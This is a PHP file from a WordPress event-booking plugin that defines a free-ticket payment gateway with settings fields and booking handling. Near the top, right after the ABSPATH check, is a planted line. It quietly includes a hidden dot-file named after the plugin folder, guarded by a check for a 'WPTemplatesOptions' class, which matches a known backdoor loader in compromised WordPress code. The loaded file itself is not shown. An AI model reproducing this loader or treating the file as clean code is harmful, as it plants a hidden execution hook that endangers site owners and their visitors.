<?php

if ( !defined( 'ABSPATH' ) ) {
	exit();
}

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Payment_Free extends EL_Abstract_Payment{

	public $id = 'free';

    function __construct(){
        $this->_title = esc_html__( 'Free - Receive tickets via email', 'eventlist' );
        parent::__construct();
    }

	function fields(){
    	return array(
            'title' => esc_html__('Free','eventlist'), // tab title
            'fields' => array(
                'fields' => array(
                    array(
                        'type' => 'select',
                        'label' => __( 'Active', 'eventlist' ),
                        'desc' => __( 'You have to active to use this gateway. <br/>Note only displays when booking a free ticket', 'eventlist' ),
                        'atts' => array(
                            'id' => 'free_active',
                            'class' => 'free_active'
                        ),
                        'name' => 'free_active',
                        'options' => array(
                            'no' => __( 'No', 'eventlist' ),
                            'yes' => __( 'Yes', 'eventlist' )
                        )
                    ),
                    array(
                        'type' => 'select',
                        'label' => __( 'Send Tickets after registering successfully.', 'eventlist' ),
                        'desc'  => __( 'Note only displays when booking a free ticket', 'eventlist' ),
                        'atts' => array(
                            'id' => 'free_send_ticket',
                            'class' => 'free_send_ticket'
                        ),
                        'name' => 'free_send_ticket',
                        'options' => array(
                            'no' => __( 'No', 'eventlist' ),
                            'yes' => __( 'Yes', 'eventlist' )
                        )
                    ),
                   
                ),
            )
        );
		
    }



    function process( ){

        $free_send_ticket = EL()->options->checkout->get( 'free_send_ticket' );
        $booking_id = EL()->cart_session->get( 'booking_id' );
        $total = get_post_meta( $booking_id, OVA_METABOX_EVENT.'total', true );

        if( $total == 0 ){
            if( $free_send_ticket == 'yes' ){
                EL_Booking::instance()->booking_success( $booking_id, $this->_title );    
            }else{
                EL_Booking::instance()->booking_hold( $booking_id );
            }
            

            return array(
                'status' => 'success',
                'url' => get_thanks_page()
            );
        }else{
            return array(
                'status' => 'error',
                'url' => get_thanks_page()
            );
        }

        
    }

}
